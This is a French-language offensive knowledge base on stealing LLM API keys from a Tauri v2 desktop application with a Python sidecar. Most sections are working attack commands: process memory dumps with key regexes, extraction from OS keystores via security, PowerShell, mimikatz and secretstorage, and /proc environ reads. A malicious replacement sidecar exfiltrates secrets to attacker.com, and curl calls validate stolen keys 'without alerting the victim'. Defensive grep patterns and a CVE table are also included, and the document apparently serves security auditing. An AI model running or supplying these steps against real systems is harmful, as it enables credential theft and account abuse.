# key-storage-attacks.md
# Base de connaissance offensive — Clés API, Secrets et Stockage

## Vue d'ensemble

Les clés API sont l'actif le plus convoité d'une application desktop multi-provider LLM. Leur cycle de vie complet est attaqué : stockage persistant (keystore OS, fichiers, variables d'environnement), transit inter-processus (IPC Rust-Python, arguments CLI), et résidence en mémoire (processus Rust, sidecar Python).

L'architecture Tauri v2 avec sidecar Python introduit plusieurs points de fuite distincts des applications web classiques : `/proc/PID/environ`, `/proc/PID/cmdline`, dump mémoire du processus, et interception du canal IPC stdin/stdout.

---

## 1. Memory Scraping des API Keys — Extraction depuis la mémoire du processus

### Vecteur : dump de la mémoire du processus Rust ou Python pour extraire les clés en clair

**Prérequis :** accès au même utilisateur Unix (pas besoin de root sur Linux par défaut)

**Étapes d'exploitation sur Linux :**
```bash
# 1. Identifier le PID du processus Tauri
pgrep -f "mon-app\|tauri\|safety"
ps aux | grep -E "\.app|tauri"

# 2. Inspecter la carte mémoire du processus
cat /proc/$(pgrep -f tauri)/maps | grep -E "heap|stack|rw"

# 3. Extraire la mémoire heap et chercher les clés API
# Pour un segment mémoire heap à l'adresse 7f8a00000000 de taille 4096 pages :
dd if=/proc/$(pgrep -f tauri)/mem bs=4096 \
   skip=$((0x7f8a00000000 / 4096)) count=1000 \
   of=/tmp/heap_dump 2>/dev/null

# 4. Chercher les patterns de clés API dans le dump
strings /tmp/heap_dump | grep -E "^sk-ant-api03-[a-zA-Z0-9_-]{20,}"
strings /tmp/heap_dump | grep -E "^sk-(proj-)?[a-zA-Z0-9_-]{20,}"
strings /tmp/heap_dump | grep -E "^gsk_[a-zA-Z0-9]{20,}"
strings /tmp/heap_dump | grep -E "^xai-[a-zA-Z0-9-]{20,}"
strings /tmp/heap_dump | grep -E "^csk-[a-zA-Z0-9-]{20,}"
strings /tmp/heap_dump | grep -E "^AIza[a-zA-Z0-9_-]{35}"
strings /tmp/heap_dump | grep -E "[0-9a-fA-F]{32}"  # Azure OpenAI
strings /tmp/heap_dump | grep -E "^sk-or-v1-[0-9a-f]{64}"  # OpenRouter

# 5. Technique avancée avec GDB
gdb -p $(pgrep -f tauri) -batch \
    -ex "set pagination off" \
    -ex "find /heap 0, 0xffffffffffffffff, \"sk-ant-\"" \
    -ex "detach"
```

**Extraction depuis le sidecar Python :**
```bash
# Le sidecar Python a la clé en mémoire après réception via stdin pipe
cat /proc/$(pgrep -f "python.*sidecar")/mem | strings | grep -E "Bearer sk-|x-api-key"

# Alternative : utiliser process_vm_readv depuis un programme C compilé
# pour contourner les restrictions /proc/mem sur certaines distributions
```

**Conditions favorables pour l'attaquant :**
- Clé stockée dans `String` standard Rust (pas `SecretString`)
- Clé stockée dans `str` Python (immuable, internée, jamais effacée)
- `cipher_memory_security = OFF` dans SQLCipher
- Core dumps activés (`ulimit -c unlimited`)
- Application en mode debug avec symboles

**Conditions défavorables pour l'attaquant :**
- `SecretString` + `zeroize` (Rust) — clé effacée à la déallocation
- `shush-rs` avec `mlock` — page mémoire verrouillée et non swappable
- `bytearray` + `zeroize` PyPI (Python) — effacement volatile garanti

---

## 2. Keyring Dump — Extraction depuis l'OS Keystore

### Vecteur : extraction des clés depuis macOS Keychain, Windows Credential Manager, Linux libsecret

**Prérequis :** accès au compte utilisateur (même session)

### macOS Keychain

```bash
# Liste toutes les entrées du service "com.myapp.llm-keys"
security find-generic-password -s "com.myapp.llm-keys" -a "api_key_anthropic" -w
# -w = affiche le mot de passe en clair

# Dump de toutes les clés de l'application
security dump-keychain | grep -A5 "com.myapp"

# Si l'application a une ACL ouverte (keychain non verrouillé, accès consenti)
security find-generic-password -s "com.myapp.llm-keys" -g 2>&1 | grep "password:"
```

**Limitations :** le Keychain demande confirmation par prompt macOS si l'application accédante n'est pas dans l'ACL. Mais si l'attaquant exécute du code dans le même processus (injection de code, sidecar malveillant), il hérite des permissions.

### Windows Credential Manager

```powershell
# Lister toutes les credentials
cmdkey /list

# Extraction via PowerShell (accès autorisé pour le même utilisateur)
[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }

# Extraction via mimikatz (nécessite admin) :
# privilege::debug
# sekurlsa::wdigest
# dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\*
```

**SharpDPAPI** permet d'extraire les credentials DPAPI sans Mimikatz (moins détecté) :
```
SharpDPAPI.exe credentials
```

### Linux Secret Service (libsecret / GNOME Keyring)

```bash
# Lister les secrets via l'API D-Bus
secret-tool lookup service "com.myapp.llm-keys" account "api_key_anthropic"

# Dump via D-Bus direct
dbus-send --session --print-reply \
  --dest=org.freedesktop.secrets \
  /org/freedesktop/secrets/collection/default \
  org.freedesktop.DBus.Introspectable.Introspect

# Extraire via Python
import secretstorage
bus = secretstorage.dbus_init()
collection = secretstorage.get_default_collection(bus)
for item in collection.get_all_items():
    print(item.get_label(), item.get_secret())
```

**Note critique :** Linux Secret Service n'a **aucune isolation par application**. Tout processus du même utilisateur avec accès D-Bus peut lire TOUTES les entrées, quelle que soit l'application qui les a stockées.

**Bypass Linux headless :** sur les environnements sans D-Bus (WSL, CI, Docker), `keyring-rs` avec feature `linux-native` (keyutils kernel) stocke les secrets dans le kernel keyring. Accessibles via :
```bash
keyctl show @u    # Session keyring de l'utilisateur
keyctl print <key_id>  # Lire la valeur
```

---

## 3. Sidecar Injection — Intercepter les Clés en Transit

### Vecteur : remplacement ou manipulation du binaire sidecar Python

**Prérequis :** accès en écriture au répertoire de l'application ou aux binaires PyInstaller

**Mécanisme :**

Tauri v2 exécute le sidecar Python comme un processus enfant. Le chemin du binaire est résolu depuis le répertoire de l'application. Si un attaquant peut remplacer le binaire sidecar par un exécutable malveillant, il reçoit les clés API via stdin pipe au démarrage.

**Attaque de remplacement binaire :**
```python
# Sidecar malveillant remplaçant le légitime
import sys
import json

# Lire les secrets envoyés par le parent Tauri
line = sys.stdin.readline()
secrets = json.loads(line.strip())

# Exfiltrer vers un serveur externe
import urllib.request
urllib.request.urlopen(
    "https://attacker.com/collect",
    data=json.dumps(secrets).encode()
)

# Répondre "READY" pour ne pas alerter
print("READY", flush=True)
```

**DLL Side-Loading (Windows) :**
Un attaquant place une DLL malveillante portant le nom d'une DLL légitime dans le répertoire du sidecar PyInstaller. Quand le sidecar charge, la DLL malveillante est chargée en premier (exemple de la campagne 3CX 2023, campagne libcares-2.dll via GitKraken janvier 2026).

**DYLD_INSERT_LIBRARIES (macOS) / LD_PRELOAD (Linux) :**
```bash
# Injecter une bibliothèque dans le processus sidecar pour intercepter les appels mémoire
DYLD_INSERT_LIBRARIES=/path/to/evil.dylib ./sidecar-binary

# Sur Linux :
LD_PRELOAD=/path/to/evil.so ./sidecar-binary
```

**Pattern de détection :**
```bash
# Hash du binaire sidecar non vérifié au démarrage
grep -rn "sidecar\|external_bin\|spawn" --include="*.rs" | grep -v "hash\|verify\|checksum"

# Présence de vérification d'intégrité
grep -rn "sha256\|blake3\|md5\|hash" --include="*.rs" | grep -i "sidecar\|binary\|exe"
```

---

## 4. IPC Interception — Capturer les Clés Passées Entre Composants

### Vecteur : lecture du canal stdin/stdout entre Tauri et le sidecar Python

**Prérequis :** accès au même utilisateur Unix

**Lecture du stdin pipe via /proc :**
```bash
# Le pipe stdin du sidecar est un file descriptor accessible via /proc
ls -la /proc/$(pgrep -f "python.*sidecar")/fd/

# Surveiller le stdin du sidecar en temps réel (si /proc/PID/fd/0 est un pipe)
# Technique : utiliser strace pour capturer les reads/writes sur le pipe
strace -p $(pgrep -f "python.*sidecar") -e trace=read,write -s 1000 2>&1 | grep -A2 "read(0"
```

**Interception via ptrace :**
```c
// Un attaquant peut s'attacher au processus Python et intercepter
// tous les sys_read sur le file descriptor 0 (stdin)
ptrace(PTRACE_ATTACH, python_pid, NULL, NULL);
// Lire les arguments de sys_read pour capturer le contenu du pipe
```

**Vecteur IPC non authentifié :**

L'IPC Tauri v2 entre le WebView JavaScript et le backend Rust est protégé par un système de capabilities. Mais l'IPC entre le backend Rust et le sidecar Python via stdin/stdout est **non authentifié par défaut** :
- Aucun HMAC sur les messages
- Aucune vérification d'identité du processus récepteur
- Pas de chiffrement du contenu du pipe

Si un processus malveillant parvient à rediriger les file descriptors du pipe, il capture les secrets.

**Audit de Radically Open Security :** 23 issues identifiées sur Tauri v2 dont 11 High. La clé de chiffrement du pattern d'isolation était extractible depuis JavaScript (`SubtleCrypto extractable: true`) avant le correctif PR #9327 — illustrant la fragilité de la chaîne IPC.

**Pattern de détection :**
```bash
# IPC sans authentification HMAC
grep -rn "child.write\|stdin.write" --include="*.rs" | grep -v "hmac\|sign\|signature"
grep -rn "HMAC\|hmac\|sign_message" --include="*.rs"
# Absence = messages IPC non authentifiés

# Vérification SO_PEERCRED absente (Unix Domain Sockets)
grep -rn "peer_cred\|SO_PEERCRED\|PeerCred" --include="*.rs"
```

---

## 5. tauri-plugin-stronghold Deprecated — Failles Connues

### Statut : DÉPRÉCIÉ — sera supprimé dans Tauri v3

**Déclaration officielle :** le mainteneur Tauri FabianLars a confirmé dans la discussion GitHub #7846 : *"stronghold is no longer recommended and will be deprecated and therefore removed in v3."*

**Dépôt IOTA Stronghold archivé le 20 mai 2025.** Le projet `iota.rs` sous-jacent n'est plus maintenu.

**Failles connues :**
1. **Aucun audit de sécurité formel n'a jamais été complété** sur tauri-plugin-stronghold
2. La documentation admet explicitement l'absence d'audit
3. La clé de chiffrement du vault Stronghold était gérée via Argon2id + mot de passe maître — mais si le mot de passe maître est faible, le vault est trivial à bruteforcer
4. La bibliothèque IOTA Stronghold utilise XChaCha20-Poly1305 pour le chiffrement, mais avec une implémentation non auditée

**Vecteur d'exploitation :**
```bash
# Chercher les applications utilisant encore stronghold
grep -rn "tauri-plugin-stronghold\|stronghold" Cargo.toml package.json
# Si trouvé : vecteur actif de failles non documentées + pas de support futur
```

**Pattern de détection :**
```bash
grep -rn "stronghold" Cargo.toml Cargo.lock tauri.conf.json
# Présence = dépendance dépréciée non auditée
```

---

## 6. BYOK — Patterns de Clés des 12 Providers LLM (Identification et Exfiltration)

### Vecteur : identification et extraction de clés API par reconnaissance de pattern

**Tableau complet des patterns de clés (à utiliser pour le scanning mémoire/fichiers) :**

| Provider | Préfixe | Regex de détection | Endpoint de vérification |
|----------|---------|-------------------|--------------------------|
| Groq | `gsk_` | `gsk_[a-zA-Z0-9]{20,}` | GET /openai/v1/models |
| Anthropic | `sk-ant-api03-` | `sk-ant-api03-[a-zA-Z0-9_\-]{20,}` | POST /v1/messages |
| OpenAI | `sk-proj-` ou `sk-` | `sk-(proj-)?[a-zA-Z0-9_\-]{20,}` | GET /v1/models |
| Azure OpenAI | (hex brut) | `[0-9a-fA-F]{32}` | GET /openai/models |
| Google Gemini | `AIza` | `AIza[a-zA-Z0-9_\-]{35}` | GET /v1beta/models?key= |
| Mistral | (aucun fixe) | `[a-zA-Z0-9]{32,}` (ambigu) | GET /v1/models |
| DeepSeek | `sk-` | `sk-[a-zA-Z0-9]{20,}` | GET /models |
| xAI (Grok) | `xai-` | `xai-[a-zA-Z0-9\-]{20,}` | GET /v1/models |
| OpenRouter | `sk-or-v1-` | `sk-or-v1-[0-9a-f]{64}` | GET /api/v1/models |
| Moonshot | `sk-` | `sk-[a-zA-Z0-9]{20,}` | GET /v1/models |
| Cerebras | `csk-` | `csk-[a-zA-Z0-9\-]{20,}` | GET /v1/models |
| Ollama | (aucune) | N/A | GET /api/tags (local) |

**Technique de vérification de clé volée sans alerter la victime :**
```bash
# Anthropic : appel minimal (1 token), coût infime
curl -s -o /dev/null -w "%{http_code}" \
  -X POST https://api.anthropic.com/v1/messages \
  -H "x-api-key: <CLEE_VOLEE>" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{"model":"claude-haiku-3","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}'
# 200 = clé valide ; 401 = invalide ; 429 = rate limited (clé valide mais limite atteinte)

# OpenAI/Groq/Mistral : appel gratuit
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <CLEE_VOLEE>" \
  https://api.groq.com/openai/v1/models
# 200 = valide

# Google Gemini : appel GET gratuit
curl -s -o /dev/null -w "%{http_code}" \
  "https://generativelanguage.googleapis.com/v1beta/models?key=<CLEE_VOLEE>"
```

**Format des clés dans le code source (recherche statique) :**
```bash
# Scan de secrets dans le code source et les fichiers de config
grep -rn "sk-ant-api03-\|gsk_\|xai-\|sk-or-v1-\|csk-\|AIza" .
grep -rn "ANTHROPIC_API_KEY\|OPENAI_API_KEY\|GROQ_API_KEY" .
trufflehog filesystem . --only-verified  # Outil dédié
```

---

## 7. Environment Variable Leak — /proc/*/environ

### Vecteur : lecture des variables d'environnement du processus via /proc

**Prérequis :** accès au même utilisateur Unix

**Mécanisme :**

`/proc/PID/environ` contient toutes les variables d'environnement passées au processus lors de son `execve()`. Si les clés API sont passées via variables d'environnement au processus Python ou Rust, elles sont lisibles ici pour toute la durée de vie du processus.

```bash
# Lire les variables d'environnement du processus cible
cat /proc/$(pgrep -f "mon-app")/environ | tr '\0' '\n'
cat /proc/$(pgrep -f "python.*sidecar")/environ | tr '\0' '\n' | grep -i "key\|token\|secret\|api"

# Les variables héritées par les processus enfants sont aussi exposées
# Un processus qui fork() et exec() transmet son environnement complet
```

**Variables fréquemment exposées :**
- `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GROQ_API_KEY` (et variantes)
- `DATABASE_URL` avec mots de passe embarqués
- `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`
- `GITHUB_TOKEN`, `NPM_TOKEN`, `PYPI_TOKEN`
- Tout secret passé via les mécanismes d'injection de CI/CD (GitHub Actions, etc.)

**Document source :** la comparaison des canaux de transmission confirme que les variables d'environnement sont « lisibles par le même utilisateur via `/proc/PID/environ` et héritées par tous les sous-processus ». Le stdin pipe est le seul canal qui n'expose pas le contenu dans /proc.

**Pattern de détection :**
```bash
grep -rn "env::\|std::env\|os.environ\|getenv" --include="*.rs" --include="*.py" | grep -i "key\|token\|secret"
grep -rn "OPENAI\|ANTHROPIC\|GROQ\|MISTRAL\|API_KEY" --include="*.rs" --include="*.py" --include="*.env"
```

---

## 8. .env File Exposure

### Vecteur : clés en clair dans les fichiers .env sur le disque

**Mécanisme :**

Les fichiers `.env` contiennent des variables d'environnement en texte clair. Ils sont souvent committé par erreur dans des dépôts Git, accessibles en lecture à d'autres utilisateurs si les permissions sont incorrectes, ou sauvegardés/synchronisés avec des services cloud.

**Emplacements typiques :**
```bash
# Fichiers .env courants dans un projet Tauri/Rust/React
.env
.env.local
.env.production
.env.development
.env.staging
src-tauri/.env
frontend/.env
sidecar/.env
```

**Techniques d'exfiltration :**
```bash
# Fichiers .env commités dans l'historique Git (fréquent)
git log --all --oneline -- .env
git show <commit>:.env

# Scan du système de fichiers pour les fichiers .env lisibles
find /home /opt /usr/local -name "*.env" -readable 2>/dev/null
find / -name ".env*" -not -path "*/node_modules/*" -readable 2>/dev/null

# Trouver des secrets hardcodés dans le code
trufflehog git file://. --since-commit HEAD --only-verified
```

**Point critique :** les fichiers `.env.production` avec des vraies clés de production sont les plus dangereux. Ils sont souvent copiés sur les machines de développement pour le débogage et oubliés.

**Pattern de détection :**
```bash
grep -rn "dotenv\|load_dotenv\|from_dotenv" --include="*.rs" --include="*.py"
ls -la .env* 2>/dev/null
git log --all --full-history -- '*.env*' | head -20
```

---

## 9. Zeroize Bypass — Mémoire Non Effacée Après Usage

### Vecteur : récupération de clés depuis la mémoire "libérée" non zéroïsée

**Mécanisme Rust :**

Le compilateur Rust peut éliminer les opérations d'effacement mémoire comme des "dead stores" si les variables ne sont plus utilisées après l'effacement. Un simple `drop(secret)` ou `secret = "".to_string()` n'efface pas nécessairement les octets en mémoire — l'allocateur Rust réutilise la mémoire libérée sans l'effacer.

```rust
// ❌ BYPASS possible — le compilateur peut optimiser cet effacement
let mut api_key = String::from("sk-ant-api03-...");
// ... utilisation ...
api_key.clear();  // Le compilateur peut éliminer cette ligne (dead store)
drop(api_key);    // La mémoire est libérée mais pas forcément effacée
```

**`zeroize` est la solution — mais des bypasses existent :**

1. **Strings Python immuables** : `del api_key` en Python ne garantit pas l'effacement. Les strings Python sont immuables et peuvent être internées. L'interning signifie que plusieurs références pointent vers le même objet — il n'est jamais collecté si une référence persiste.

2. **Copie accidentelle** : si la clé est copiée dans un `String` standard avant `SecretString`, la copie reste en mémoire non effacée.

3. **Sérialisation JSON** : `serde_json::to_string(&payload)` crée une copie de la clé dans un `String` non protégé.

4. **Logs** : même avec `SecretString`, si la clé est extraite avec `expose_secret()` et passée à `format!()` pour un log, la chaîne formatée reste en mémoire.

**Vérification de l'effacement :**
```bash
# Après fermeture de l'application, chercher des résidus en mémoire swap
strings /dev/mem 2>/dev/null | grep -E "sk-ant-|gsk_|xai-"

# Si core dump disponible
strings core | grep -E "sk-ant-|Bearer sk-"

# En direct avec gdb sur le processus actif
gdb -p PID -batch -ex "find /heap 0, 0xffffffffffffffff, \"sk-ant-\""
```

**Pattern de détection :**
```bash
# Clés dans des String standard au lieu de SecretString
grep -rn "let.*key.*=.*String\|let.*api_key.*=\"" --include="*.rs" | grep -v "SecretString\|SecretVec"

# expose_secret() suivi de format!() (copie non protégée)
grep -rn "expose_secret()" --include="*.rs" -A2 | grep "format!\|log\|info!\|debug!"

# Python : str au lieu de bytearray pour les secrets
grep -rn "api_key\s*=\s*['\"]" --include="*.py"
grep -rn "bytearray\|zeroize" --include="*.py"
# Absence de bytearray = pas d'effacement possible

# Désactivation des core dumps
grep -rn "RLIMIT_CORE\|setrlimit\|disable_core" --include="*.rs" --include="*.py"
```

---

## Table des CVEs et Advisories

| CVE / Advisory | CVSS | Composant | Impact offensif |
|----------------|------|-----------|----------------|
| CVE-2025-31477 | 9.8 | tauri-plugin-shell < 2.2.1 | RCE via protocoles shell non validés (`file://`, `smb://`) |
| CVE-2025-65717 | 9.1 | Extension VS Code "Live Server" (117M installs) | Exfiltration de fichiers incluant .env et clés API |
| CVE-2025-65715 | 7.8 | Extension VS Code "Code Runner" | Exfiltration de fichiers depuis machine développeur |
| CVE-2024-35222 | 5.9 | Tauri v2 IPC | iFrames distants accédant aux endpoints IPC |
| CVE-2025-6965 | 9.8 | SQLite < 3.50.2 | Memory corruption via requêtes SQL |
| GHSA-4xh5-x5gv-qwph | — | pip < 25.2 | Traversée de chemin dans paquets sdist malveillants |
| RUSTSEC-2025-0004 | — | crate openssl (native-tls) | Use-after-free dans TLS |

---

## Grep Patterns — Détection Complète des Vulnérabilités

```bash
# 1. Clés API dans variables d'environnement (visible via /proc/*/environ)
grep -rn "os\.environ\.get\|std::env::var" --include="*.py" --include="*.rs" | grep -iE "key|token|secret"

# 2. Clés en clair dans fichiers .env
find . -name ".env*" -not -path "*/node_modules/*" -exec grep -l "sk-\|gsk_\|xai-\|AIza" {} \;

# 3. Variables d'environnement passées au sidecar
grep -rn "env\|envs\|environment" --include="*.rs" | grep -i "sidecar\|spawn\|Command"

# 4. stronghold déprécié
grep -rn "stronghold" Cargo.toml Cargo.lock

# 5. Zeroize absent (clés non effacées)
grep -rn "SecretString\|SecretVec\|ZeroizeOnDrop\|zeroize" --include="*.rs" | wc -l
# Si < 5 occurrences dans une app gérant des clés API : suspect

# 6. expose_secret() mal utilisé (copie dans log ou format!)
grep -rn "expose_secret()" --include="*.rs" -A3 | grep -E "format!|log|info!|debug!|error!|warn!"

# 7. String Python non zéroïsable pour les secrets
grep -rn "api_key\s*=\|secret\s*=\|password\s*=" --include="*.py" | grep -v "bytearray\|SecretValue"

# 8. Transmission des clés via arguments CLI (world-readable)
grep -rn "\.arg(" --include="*.rs" | grep -iE "key|token|secret|password"

# 9. IPC sans HMAC (non authentifié)
grep -rn "child\.write\|stdin\.write_all" --include="*.rs" -B5 | grep -v "hmac\|sign\|signature\|HMAC"

# 10. Core dumps non désactivés
grep -rn "RLIMIT_CORE\|setrlimit\|disable_core_dump" --include="*.rs" --include="*.py"
# Absence = core dumps actifs = secrets extractibles post-crash

# 11. Patterns de clés dans les fichiers de code (hardcodées)
grep -rn "sk-ant-api03-\|gsk_[a-zA-Z0-9]\|xai-[a-zA-Z0-9]\|csk-[a-zA-Z0-9]\|sk-or-v1-" .

# 12. keyring-rs avec backend insécurisé sur Linux
grep -rn "linux-native\|keyutils\|mock" Cargo.toml
# linux-native (keyutils) = session-scoped, disparaît au logout
# mock = stockage en mémoire non persistant, pas de protection

# 13. Sidecar sans vérification de hash au démarrage
grep -rn "sidecar\|external_bin" --include="*.rs" -A10 | grep -v "sha256\|hash\|verify\|integrity"

# 14. pipe stdout/stderr contenant des secrets
grep -rn "println!\|eprintln!\|print!" --include="*.rs" | grep -iE "key|token|secret|bearer|api"
grep -rn "print\|logging" --include="*.py" | grep -iE "key|token|secret|bearer|api"

# 15. tauri-plugin-store pour des secrets (stockage JSON non chiffré)
grep -rn "tauri-plugin-store\|StoreExt\|store\." --include="*.rs" --include="*.ts" | grep -iE "key|token|secret"
```
